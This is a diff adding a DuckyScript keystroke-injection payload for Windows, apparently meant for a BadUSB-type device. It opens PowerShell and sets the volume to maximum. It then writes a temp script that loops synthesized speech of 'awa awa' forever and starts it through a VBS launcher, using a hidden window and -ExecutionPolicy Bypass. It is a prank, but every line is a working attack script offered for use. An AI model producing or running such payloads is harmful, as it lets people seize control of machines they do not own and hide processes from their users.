@@ -1,0 +1,29 @@
+REM Title: awa awawa awa awa awawa
+REM Author: 7h30th3r0n3
+REM Target: Windows 7/8/10/11
+REM Version: awa
+REM Category: awa awawa awa awa awawa
+REM Description: awa awawa awa awa awawa
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+REM Set volume to maximum
+STRING $obj = New-Object -ComObject WScript.Shell; for ($i = 0; $i -lt 50; $i++) {$obj.SendKeys([char] 175)}
+ENTER
+DELAY 500
+REM Create PowerShell script that awa awa
+STRING $psPath = [IO.Path]::Combine($env:TEMP, 'test.ps1'); $psCode = '$sp = New-Object -ComObject SAPI.SpVoice;$sp.Rate = -1; while ($true) {$sp.Speak("awa awa wa wa awa awa awa awa wa awa wa awa awa wa awa awa awa wa awa awa wa awa wa awa awa awa wa awa awa wa awa")}'; Set-Content -Path $psPath -Value $psCode;
+ENTER
+DELAY 500
+REM Create VBS script to launch it in background
+STRING $vbsPath = [IO.Path]::Combine($env:TEMP, 'RunInvisible.vbs'); $vbsCode = 'Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""' + $psPath + '""", 0, False'; Set-Content -Path $vbsPath -Value $vbsCode;
+ENTER
+DELAY 500
+REM Execute VBS script
+STRING Start-Process -FilePath 'wscript.exe' -ArgumentList $vbsPath
+ENTER
+STRING exit
+ENTER
